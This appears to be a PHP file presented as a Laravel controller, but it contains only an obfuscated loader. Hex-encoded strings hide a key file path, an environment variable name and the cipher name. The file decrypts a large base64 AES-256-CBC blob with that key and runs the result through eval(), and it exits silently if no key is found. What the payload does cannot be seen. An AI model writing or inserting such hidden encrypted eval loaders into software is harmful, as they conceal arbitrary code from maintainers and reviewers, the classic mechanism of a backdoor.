<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ndebaIuw+hBIJvyaZvMiTQ==');

$c=base64_decode(

'HHCUWhNwr+9Hn9Ewuzto94rPeUO7v1MRJosc4qkz6EuGcuDOJXV+ZEbz9t/Eb8h7/1LnTUxBvT36' .
'CYKFG1U97l7LtRv0KCl8O1lP9TDFX3OLr9xbNq2xsR4YfHvhCvi9tumabHU/7Tcdcp2z/EHM/Mf0' .
'TNnKd540y4HK6yqRo8qDoAlvnC6gwQWAYej89quVa1jPWpQLZVYr1X/UINIf/M4dTmZsznoeVjA/' .
'U9SwrZP+8mF/Xj2Uw3rDnxprQxSr/PvZPoYLtCpHXCJ2HmH8pIHg9P3sswuE97Hh9EqcoIfxF7Nk' .
'fcbNuhBxc2hbSj0YeuCQH640J4P9PZWifDdKYuCskx0pgsu8pT4m9CeMKe3YFeLeOyL+ZvU79Cu7' .
'Rzext0iklfvzkWxrpnBCYtZ10MEHuuciDte3lWNC3uziJ2NPwrAQW/eSqBzejU7eRyc/JF4TV/6K' .
'7oN+Kf/TKaFTSWXpGCdNaAjpkDxRHRFvno+RgfnSgLQv/3SCmFfossQb50pDIDA7MVDQoo0mb32+' .
'sG28+1baew7i9oLmYa4pesP6CJfAp7mJa8ro9RMK2UppVwhB9Gszd1LDNZSMY1YIDeTET22Fz8SW' .
'7BUKz6TNw1iI/nG6s0PXXGYEjVzWW0Qq/83sJsStNYi/5tUPLD+vwRMjkr2NGboVucpiqT97q4rE' .
't5LfkVQeG6Bxd5R+MIuimDz4A9OPyUK9fuMztglwyoVD/fehaCIfpFjtGM844d73WWwcL+HgWEM4' .
'Y2fiIM/Ev9+T93EP/koe1dJXJjIoxvbhHnHw6sl7weJysi2N0HqLp+fgNXFvcQY3FPggOdC3p9x6' .
'zNOFzRGWGO2eLfy16gwhESa43tyUNZwq05s2+lnHgpcik9WraHGEHDWJjPGDQWyZ6GAmVTnRANMk' .
'lcNbETWb/GqVALwv2XAE4JRqb5PumPMX6c5JHoTTVrOj18P5JGhCUSYG0cScU19ohVicTS7ZA4vc' .
'XW7DRNHAK6B45clRpA6ci1R4RkFLpHkda1j6GLYSP1Xlv+QzN4tEygK+uIZwhEwYNFQJCq3irKWQ' .
'+F7L4Wgrv6edGjffEmFzNYaSjzIfQgRMO3hzZ3ox9ElmKXVDYLoR7zabrH5v8c5GlS81F98sYePn' .
'WkIEGBGHYfcgs/vVZY/B+i6Jqar1SKfTNNAVvKSZEkDK/Z0angcauBJtUiePwW+py7egD3zeWxBn' .
'dSRNFWxeCwo5K0CyM8bdD4kEsWURow+ooLl3xoAfEwmFj0tgLt3Srm335NZXNYRNQ70uLDZl3SoD' .
'vkQyVWEPshyzHzKTuvlHqsYuJEmoZFsFfrnSFRG9RUR7YJZfl48bTS241zlK4BnrwrQQvVLNLhBk' .
'oF9oAc/t4nAqTgytYBXWXV+TDCVd3ddAzdiTWGzdz87HBiWTU9FOIbvG1w0tZ9HrYnM1ecj5+MGz' .
'fULT1PqW55ZxRXZe8HluRBiuh5iLFhNq/2NjZYpevPCtd9q5bezMtFhv6xfCjSmeAc7jFgSokfSL' .
'DJbHrkV7+RSXZ8sRGp07OW2Tmq+BcuZ8498E+My61hwafKMGxDll121luxlCpRfJNWJWo1nqG8Ia' .
'wXxmykQql/MyOL0hctVv0q0Zv0X67cVm8x6vmIOG87QCYsJeV2U0kkva3cU+PXitDvl0HFpDAZtn' .
'dC7D8Cve9vcZP154lC7adIa8c9y69eE73Ex4sxaeacsJeXE7k/h2+kmmVVwjepiTS3pOOP/2Oafl' .
'gmjZx+xQ9gXXzmFMd7gubqBePGWxr3fkM7CmhiEIOCEl3fN9s4buZdgwJXWV+NEPhtUayYNILcHw' .
'g80pyv/qW4U7L8ldTIIKBMCY8CIZV02LFmJiE/niygAx5w5+pqxgSnmM0SmtcJ5qnfPCttZGqv0x' .
'1SxNaM8j78PGxMEHLxIcfdc+A8s+RO6AlGJMaZRpcTQNB24ujU264z6XdQXPS74DuVquov7fBQq/' .
'SmRxI2PfEMeAhuSirYBetsQqbqpnNJoChP3YWDCKGjuXWIQfXL3wCNpzSWh9sz4+IBRpm3LGiN4S' .
'qhHaPsyWOA0WyRbS9fR1xMEOcVaJXDj4ZdjeMC8KOJGuGKStzD0ugHjTN8rLgu/rBlkKWS6ybJCT' .
'3Arur1Wp+Qrj8iM8pW6uY6/txxXdIkzJyDhjNxC9C9LhmGBNilvCnIjYytHGCrdxN4G0cpwh1pMg' .
'S4ep5K7maKyaQGWi6W20S+XMpsNrmN8q04C+yTxUS3tXkQ2b4MUFcUVRX8rPnYyxQgf3BVqCuVDl' .
'q9vQIHosU4ZdZZuJbh6oUAl4c6JiG96cLP8OyAzdxhYLPmmzHASrkvJOympeb27dhttNHKqsXhmj' .
'X42np3Pl8kCPRZoYsmwrL8dQbB3xcPSV1ErESJXnJncU/3kFY6J2ym1ixj673TKYBmyYI++uwMKD' .
'7j/Vc24PiqjilAoi3S4PPdVmca1JUNK9ALw5E6I0s/+z5DHIcPwOqhySk1DhK6XQA2+GxWG6ozKu' .
'm2sGVHdCUg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

